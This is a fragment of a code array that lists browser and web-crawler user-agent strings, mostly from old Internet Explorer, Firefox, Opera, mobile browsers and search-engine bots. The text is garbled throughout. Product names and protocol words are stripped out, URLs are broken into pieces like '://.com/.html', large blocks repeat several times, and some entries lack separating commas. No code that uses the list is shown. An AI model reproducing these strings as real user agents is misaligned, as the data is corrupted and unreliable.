	"/4.0 ; MSIE 6.1; Windows XP",
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51",
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3",
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 2.0.50727",
	"/5.0 Windows; U; Windows NT 5.2; -; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729",
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1 .NET CLR 3.0.04506.648",
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E",
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1",
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2",
	"/9.60 J2ME/MIDP;  Mini/4.2.14912/812; U;  Presto/2.4.15",
	"/5.0 Macintosh; U; PPC Mac OS X; -US /125.4 KHTML,  Gecko, Safari OmniWeb/v563.57",
	"/5.0 SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; /MIDP-2.0 /CLDC-1.1  /413 KHTML,  Gecko Safari/413",
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729",
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0",
	"/5.0 Windows; U; WinNT4.0; -US; rv:1.8.0.5 Gecko/20060706 K-/1.0",
	"Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/",
	"/4.76 [] PalmOS; U; WebPro/; Palm-Arz1",
	"/5.0 Macintosh; U; PPC Mac OS X; - /418 KHTML,  Gecko /1.2.2 Safari/125",
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.8.1.6 Gecko/2007072300 Iceweasel/2.0.0.6 -2.0.0.6-0etch1+lenny1",
	"/5.0 SymbianOS/9.1; U; -us /413 KHTML,  Gecko Safari/413",
	"/4.0 ; MSIE 6.1; Windows NT 5.1; /4.0; SV1; .NET CLR 3.5.30729; InfoPath.2",
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US",
	"Links 2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25",
	"/4.0 ; MSIE 6.0; Windows NT 5.0; WOW64; /4.0; SLCC1",
	"/1.22 ; Konqueror/4.3; Linux KHTML/4.3.5  Gecko",
	"/4.0 ; MSIE 6.0; Windows CE;  6.5",
	"/9.80 Macintosh; U; - Presto/2.8.131 /11.10",
	"/5.0 X11; U; Linux i686; -US; rv:1.9.1.9 Gecko/20100318 /2.0.4-69.1mib2010.0 SeaMonkey/2.0.4",
	"/4.0 ; MSIE 6.1; Windows XP Gecko/20060706 /7.0",
	"/5.0 ; U; CPU OS 3_2  Mac OS X; -us /531.21.10 KHTML,  Gecko /4.0.4 /7B334b Safari/531.21.10",
	"/5.0 Macintosh; I; Intel Mac OS X 10_6_7; -",
	"/5.0 ; MSIE 9.0; Windows NT 6.1; /5.0",
	"/1.22 ; MSIE 6.0; Windows NT 6.1; /4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;  Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3",
	"/5.0 ; /3.0; +://yandex.com/bots",
	"/4.0 Macintosh; U; Intel Mac OS X 10_6_7; -US /534.16 KHTML,  Gecko /10.0.648.205 Safari/534.16",
	"/1.22 X11; U; Linux x86_64; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1",
	"/5.0 ; MSIE 2.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2",
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51",
	"/5.0 ; MSIE 2.0; Windows CE;  7.0",
	"/4.0 Macintosh; U; PPC Mac OS X; -US",
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.1.7 Gecko/20091221 Firefox/3.5.7",
	"BlackBerry8300/4.2.2 /MIDP-2.0 /CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0",
	"/1.22 ; MSIE 2.0; Windows 3.1",
	"/4.0 ; MSIE 6.0; Windows NT 5.1;  Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322",
	"/3.0 Windows NT 6.1; -; rv:1.9.1.3. Win32; x86 Firefox/3.5.3 .NET CLR 2.0.50727",
	"/7.0 ; MSIE 2.0; Windows 3.1",
	"/9.80 Windows NT 5.1; U; -US Presto/2.8.131 /11.10",
	"/4.0 ; MSIE 6.0;   Browser 1.1; rev1.5; Windows NT 5.1;",
	"/5.0 Windows; U; Windows CE 4.21; rv:1.8b4 Gecko/20050720 Minimo/0.007",
	"BlackBerry9000/5.0.0.93 /MIDP-2.0 /CLDC-1.1 VendorID/179",
	"/4.0 ; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30",
	"/4.0 ; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322",
	"/2.1 ://.com/.html",
	"/9.20 Windows NT 6.0; U; ",
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.1 Gecko/20061205 Iceweasel/2.0.0.1 -2.0.0.1+-2",
	"/4.0 ; MSIE 7.0; Windows NT 5.1; /4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322",
	"/10.00 X11; Linux i686; U;  Presto/2.2.0",
	"/5.0 Windows; U; Windows NT 6.0; -IL /528.16 KHTML,  Gecko /4.0 Safari/528.16",
	"/5.0 ; Yahoo! /3.0; ://.yahoo.com//us/ysearch/",
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2.13 Gecko/20101209 Firefox/3.6.13",
	"/4.0 ; MSIE 9.0; Windows NT 5.1; /5.0",
	"/5.0 ; MSIE 8.0; Windows NT 5.1; /4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727",
	"/4.0 ; MSIE 7.0b; Windows NT 6.0",
	"/4.0 ; MSIE 6.0b; Windows 98",
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.2.3 Gecko/20100401 Firefox/4.0 .NET CLR 3.5.30729",
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2.8 Gecko/20100804 Gentoo Firefox/3.6.8",
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2.7 Gecko/20100809 /3.6.7-1.fc14 Firefox/3.6.7",
	"/5.0 ; /2.1; +://.com/.html",
	"/5.0 ; Yahoo! ; ://.yahoo.com//us/ysearch/",
	"YahooSeeker/1.2 ;  4.0; MSIE 5.5; yahooseeker  yahoo-inc  com ; ://.yahoo.com//us///",
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3",
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729",
	"/5.0 Windows; U; Windows NT 5.2; -US; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729",
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1",
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1",
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2",
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729",
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0",
	"/4.0 ; MSIE 8.0; Windows NT 5.1; /4.0; SV1; .NET CLR 2.0.50727; InfoPath.2",
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US",
	"/4.0 ; MSIE 6.1; Windows XP",
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51",
	"-; +://.com/; : webetrex",
	"/5.0 ; MSIE 9.0; AOL 9.7;  4343.19; Windows NT 6.1; WOW64; /5.0; FunWebProducts",
	"/4.0 ; MSIE 8.0; AOL 9.7;  4343.27; Windows NT 5.1; /4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729",
	"/4.0 ; MSIE 8.0; AOL 9.7;  4343.21; Windows NT 5.1; /4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E",
	"/4.0 ; MSIE 8.0; AOL 9.7;  4343.19; Windows NT 5.1; /4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729",
	"/4.0 ; MSIE 8.0; AOL 9.7;  4343.19; Windows NT 5.1; /4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E",
	"/4.0 ; MSIE 7.0; AOL 9.7;  4343.19; Windows NT 5.1; /4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E",
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3",
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 2.0.50727",
	"/5.0 Windows; U; Windows NT 5.2; -; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729",
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1 .NET CLR 3.0.04506.648",
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E",
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1",
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2",
	"/9.60 J2ME/MIDP;  Mini/4.2.14912/812; U;  Presto/2.4.15",
	"/5.0 Macintosh; U; PPC Mac OS X; -US /125.4 KHTML,  Gecko, Safari OmniWeb/v563.57",
	"/5.0 SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; /MIDP-2.0 /CLDC-1.1  /413 KHTML,  Gecko Safari/413",
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729",
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0",
	"/5.0 Windows; U; WinNT4.0; -US; rv:1.8.0.5 Gecko/20060706 K-/1.0",
	"Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/",
	"/4.76 [] PalmOS; U; WebPro/; Palm-Arz1",
	"/5.0 Macintosh; U; PPC Mac OS X; - /418 KHTML,  Gecko /1.2.2 Safari/125",
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.8.1.6 Gecko/2007072300 Iceweasel/2.0.0.6 -2.0.0.6-0etch1+lenny1",
	"/5.0 SymbianOS/9.1; U; -us /413 KHTML,  Gecko Safari/413",
	"/4.0 ; MSIE 6.1; Windows NT 5.1; /4.0; SV1; .NET CLR 3.5.30729; InfoPath.2",
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3",    
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3",
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729",
	"/5.0 Windows; U; Windows NT 5.2; -US; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729",
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1",
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1",
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2",
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729",
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0",
	"/4.0 ; MSIE 8.0; Windows NT 5.1; /4.0; SV1; .NET CLR 2.0.50727; InfoPath.2",
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US",
	"/4.0 ; MSIE 6.1; Windows XP",
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51",
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3",
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 2.0.50727",
	"/5.0 Windows; U; Windows NT 5.2; -; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729",
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1 .NET CLR 3.0.04506.648",
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E",
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1",
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2",,
	"/9.60 J2ME/MIDP;  Mini/4.2.14912/812; U;  Presto/2.4.15",
	"/5.0 Macintosh; U; PPC Mac OS X; -US /125.4 KHTML,  Gecko, Safari OmniWeb/v563.57",
	"/5.0 SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; /MIDP-2.0 /CLDC-1.1  /413 KHTML,  Gecko Safari/413",
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729",
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0",
	"/5.0 Windows; U; WinNT4.0; -US; rv:1.8.0.5 Gecko/20060706 K-/1.0",
	"Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/",
	"/4.76 [] PalmOS; U; WebPro/; Palm-Arz1",
	"/5.0 Macintosh; U; PPC Mac OS X; - /418 KHTML,  Gecko /1.2.2 Safari/125",
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.8.1.6 Gecko/2007072300 Iceweasel/2.0.0.6 -2.0.0.6-0etch1+lenny1",
	"/5.0 SymbianOS/9.1; U; -us /413 KHTML,  Gecko Safari/413",
	"/4.0 ; MSIE 6.1; Windows NT 5.1; /4.0; SV1; .NET CLR 3.5.30729; InfoPath.2",
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US",
	"Links 2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25",
	"/4.0 ; MSIE 6.0; Windows NT 5.0; WOW64; /4.0; SLCC1",
	"/1.22 ; Konqueror/4.3; Linux KHTML/4.3.5  Gecko",
	"/4.0 ; MSIE 6.0; Windows CE;  6.5",
	"/9.80 Macintosh; U; - Presto/2.8.131 /11.10",
	"/5.0 X11; U; Linux i686; -US; rv:1.9.1.9 Gecko/20100318 /2.0.4-69.1mib2010.0 SeaMonkey/2.0.4",
	"/4.0 ; MSIE 6.1; Windows XP Gecko/20060706 /7.0",
	"/5.0 ; U; CPU OS 3_2  Mac OS X; -us /531.21.10 KHTML,  Gecko /4.0.4 /7B334b Safari/531.21.10",
	"/5.0 Macintosh; I; Intel Mac OS X 10_6_7; -",
	"/5.0 ; MSIE 9.0; Windows NT 6.1; /5.0",
	"/1.22 ; MSIE 6.0; Windows NT 6.1; /4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;  Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3",
	"/5.0 ; /3.0; +://yandex.com/bots",
	"/4.0 Macintosh; U; Intel Mac OS X 10_6_7; -US /534.16 KHTML,  Gecko /10.0.648.205 Safari/534.16",
	"/1.22 X11; U; Linux x86_64; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1",
	"/5.0 ; MSIE 2.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2",
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51",
	"/5.0 ; MSIE 2.0; Windows CE;  7.0",
	"/4.0 Macintosh; U; PPC Mac OS X; -US",
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.1.7 Gecko/20091221 Firefox/3.5.7",
	"BlackBerry8300/4.2.2 /MIDP-2.0 /CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0",
	"/1.22 ; MSIE 2.0; Windows 3.1",
	"/4.0 ; MSIE 6.0; Windows NT 5.1;  Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322",
	"/3.0 Windows NT 6.1; -; rv:1.9.1.3. Win32; x86 Firefox/3.5.3 .NET CLR 2.0.50727",
	"/7.0 ; MSIE 2.0; Windows 3.1",
	"/9.80 Windows NT 5.1; U; -US Presto/2.8.131 /11.10",
	"/4.0 ; MSIE 6.0;   Browser 1.1; rev1.5; Windows NT 5.1;",
	"/5.0 Windows; U; Windows CE 4.21; rv:1.8b4 Gecko/20050720 Minimo/0.007",
	"BlackBerry9000/5.0.0.93 /MIDP-2.0 /CLDC-1.1 VendorID/179",
	"/4.0 ; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30",
	"/4.0 ; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322",
	"/2.1 ://.com/.html",
	"/9.20 Windows NT 6.0; U; ",
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.1 Gecko/20061205 Iceweasel/2.0.0.1 -2.0.0.1+-2"
	"/4.0 ; MSIE 7.0; Windows NT 5.1; /4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322",
	"/10.00 X11; Linux i686; U;  Presto/2.2.0",
	"/5.0 Windows; U; Windows NT 6.0; -IL /528.16 KHTML,  Gecko /4.0 Safari/528.16",
	"/5.0 ; Yahoo! /3.0; ://.yahoo.com//us/ysearch/",
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2.13 Gecko/20101209 Firefox/3.6.13",
	"/4.0 ; MSIE 9.0; Windows NT 5.1; /5.0",
	"/5.0 ; MSIE 8.0; Windows NT 5.1; /4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727",
	"/4.0 ; MSIE 7.0b; Windows NT 6.0",
	"/4.0 ; MSIE 6.0b; Windows 98",
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.2.3 Gecko/20100401 Firefox/4.0 .NET CLR 3.5.30729",
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2.8 Gecko/20100804 Gentoo Firefox/3.6.8",
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2.7 Gecko/20100809 /3.6.7-1.fc14 Firefox/3.6.7",
	"/5.0 ; /2.1; +://.com/.html",
	"/5.0 ; Yahoo! ; ://.yahoo.com//us/ysearch/",
	"YahooSeeker/1.2 ;  4.0; MSIE 5.5; yahooseeker  yahoo-inc  com ; ://.yahoo.com//us///",
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3",
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729",
	"/5.0 Windows; U; Windows NT 5.2; -US; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729",
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1",
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1",
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2",
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729",
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0",
	"/4.0 ; MSIE 8.0; Windows NT 5.1; /4.0; SV1; .NET CLR 2.0.50727; InfoPath.2",
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US",
	"/4.0 ; MSIE 6.1; Windows XP",
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51",
	"-; +://.com/; : webetrex",
	"/5.0 ; MSIE 9.0; AOL 9.7;  4343.19; Windows NT 6.1; WOW64; /5.0; FunWebProducts",
	"/4.0 ; MSIE 8.0; AOL 9.7;  4343.27; Windows NT 5.1; /4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729",
	"/4.0 ; MSIE 8.0; AOL 9.7;  4343.21; Windows NT 5.1; /4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E",
	"/4.0 ; MSIE 8.0; AOL 9.7;  4343.19; Windows NT 5.1; /4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729",
	"/4.0 ; MSIE 8.0; AOL 9.7;  4343.19; Windows NT 5.1; /4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E",
	"/4.0 ; MSIE 7.0; AOL 9.7;  4343.19; Windows NT 5.1; /4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E",
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3",
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 2.0.50727",
	"/5.0 Windows; U; Windows NT 5.2; -; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729",
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1 .NET CLR 3.0.04506.648",
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E",
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1",
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2",
	"/9.60 J2ME/MIDP;  Mini/4.2.14912/812; U;  Presto/2.4.15",
	"/5.0 Macintosh; U; PPC Mac OS X; -US /125.4 KHTML,  Gecko, Safari OmniWeb/v563.57",
	"/5.0 SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; /MIDP-2.0 /CLDC-1.1  /413 KHTML,  Gecko Safari/413",
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729",
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0",
	"/5.0 Windows; U; WinNT4.0; -US; rv:1.8.0.5 Gecko/20060706 K-/1.0",
	"Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/",
	"/4.76 [] PalmOS; U; WebPro/; Palm-Arz1",
	"/5.0 Macintosh; U; PPC Mac OS X; - /418 KHTML,  Gecko /1.2.2 Safari/125",
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.8.1.6 Gecko/2007072300 Iceweasel/2.0.0.6 -2.0.0.6-0etch1+lenny1",
	"/5.0 SymbianOS/9.1; U; -us /413 KHTML,  Gecko Safari/413"
	"/4.0 ; MSIE 6.1; Windows NT 5.1; /4.0; SV1; .NET CLR 3.5.30729; InfoPath.2",
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US",
	"Links 2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25",
	"/4.0 ; MSIE 6.0; Windows NT 5.0; WOW64; /4.0; SLCC1",
	"/1.22 ; Konqueror/4.3; Linux KHTML/4.3.5  Gecko",
	"/4.0 ; MSIE 6.0; Windows CE;  6.5",
	"/9.80 Macintosh; U; - Presto/2.8.131 /11.10",
	"/5.0 X11; U; Linux i686; -US; rv:1.9.1.9 Gecko/20100318 /2.0.4-69.1mib2010.0 SeaMonkey/2.0.4",
	"/4.0 ; MSIE 6.1; Windows XP Gecko/20060706 /7.0",
	"/5.0 ; U; CPU OS 3_2  Mac OS X; -us /531.21.10 KHTML,  Gecko /4.0.4 /7B334b Safari/531.21.10",
	"/5.0 Macintosh; I; Intel Mac OS X 10_6_7; -",
	"/5.0 ; MSIE 9.0; Windows NT 6.1; /5.0",
	"/1.22 ; MSIE 6.0; Windows NT 6.1; /4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;  Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3",
	"/5.0 ; /3.0; +://yandex.com/bots",
	"/4.0 Macintosh; U; Intel Mac OS X 10_6_7; -US /534.16 KHTML,  Gecko /10.0.648.205 Safari/534.16",
	"/1.22 X11; U; Linux x86_64; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1",
	"/5.0 ; MSIE 2.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2",
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51"
	"/5.0 ; MSIE 2.0; Windows CE;  7.0",
	"/4.0 Macintosh; U; PPC Mac OS X; -US",
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.1.7 Gecko/20091221 Firefox/3.5.7",
	"BlackBerry8300/4.2.2 /MIDP-2.0 /CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0",
	"/1.22 ; MSIE 2.0; Windows 3.1",
	"/4.0 ; MSIE 6.0; Windows NT 5.1;  Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322",
	"/3.0 Windows NT 6.1; -; rv:1.9.1.3. Win32; x86 Firefox/3.5.3 .NET CLR 2.0.50727",
	"/7.0 ; MSIE 2.0; Windows 3.1",
	"/9.80 Windows NT 5.1; U; -US Presto/2.8.131 /11.10",
	"/4.0 ; MSIE 6.0;   Browser 1.1; rev1.5; Windows NT 5.1;",
	"/5.0 Windows; U; Windows CE 4.21; rv:1.8b4 Gecko/20050720 Minimo/0.007",
	"BlackBerry9000/5.0.0.93 /MIDP-2.0 /CLDC-1.1 VendorID/179",
	"/5.0 ; 008/0.83; ://www.80legs.com/webcrawler.html Gecko/2008032620",
	"/4.0 ; MSIE 7.0; Windows NT 6.0  www.idealobserver.com",
	"/5.0 ; /1.0; +://www.anyapex.com/.html",
	"/4.0 ; Arachmo",
	"/4.0 ; B-l-i--z-B-O-T",
	"/5.0 ; Baiduspider/2.0; +://.com/search/spider.html",
	"/5.0 ; Baiduspider/2.0; +://.com/search/spider.html",
	"/5.0 ; /2.3; MSIE 6.0 ; +://.com/site_owners.html",
	"/1.0 +://.com/crawler/",
	"/5.0 ; /2.0; +://.com/.htm",
	"Sqworm/2.9.85-BETA beta_release; 20011115-775; i686-pc-linux-",
	"/5.0 ; YandexImages/3.0; +://yandex.com/bots",
	"/5.0 ; Yahoo! ; ://.yahoo.com//us/ysearch/",
	"/5.0 ; /1.0; ://www.yodao.com//webmaster/spider/; ",
	"/5.0 ; /1.0; ://www.yodao.com//webmaster/spider/; ",
	"/4.0  /1.0  Link Checker @; ://.com",
	"/4.0  /1.0  Link Checker .dlc@; ://.com",
	"/4.0  /1.0 -@; ://.com",
	"/5.0 ; U;  0.6;  /420+ KHTML,  Gecko",
	"/5.0 ; MSIE 8.0; Windows NT 6.0; /4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729",
